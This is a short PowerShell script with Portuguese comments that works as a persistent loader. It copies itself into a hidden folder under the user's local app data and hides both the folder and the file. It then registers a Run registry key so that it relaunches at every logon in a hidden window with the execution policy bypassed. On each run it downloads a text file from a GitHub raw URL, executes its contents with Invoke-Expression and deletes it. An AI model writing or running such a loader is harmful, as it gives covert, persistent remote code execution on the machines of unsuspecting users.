# ============================================================
# INSTALAÇÃO AUTOMÁTICA PARA O USUÁRIO ATUAL
# ============================================================

$installDir  = Join-Path $env:LOCALAPPDATA "MeuScript"
$installPath = Join-Path $installDir "6.ps1"

# Cria a pasta de instalação
New-Item -ItemType Directory -Path $installDir -Force | Out-Null

# Copia o script para o local permanente
if ($PSCommandPath -ne $installPath) {
    Copy-Item -Path $PSCommandPath -Destination $installPath -Force
}

# Marca a pasta como oculta
$dirInfo = Get-Item $installDir
$dirInfo.Attributes = $dirInfo.Attributes -bor [System.IO.FileAttributes]::Hidden

# Marca o arquivo como oculto
$fileInfo = Get-Item $installPath
$fileInfo.Attributes = $fileInfo.Attributes -bor [System.IO.FileAttributes]::Hidden

# ============================================================
# CONFIGURA INICIALIZAÇÃO AUTOMÁTICA
# ============================================================

$runCommand = 'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "' + $installPath + '"'

New-ItemProperty `
    -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "MeuScript" `
    -Value $runCommand `
    -PropertyType String `
    -Force | Out-Null

# ============================================================
# SEU CÓDIGO ORIGINAL
# ============================================================

$f = Join-Path $installDir "b1.txt"; Invoke-WebRequest "https://raw.githubusercontent.com/c0261/1/main/b1.txt" -OutFile $f; Invoke-Expression (Get-Content $f -Raw); Remove-Item $f

Stop-Process -Id $PID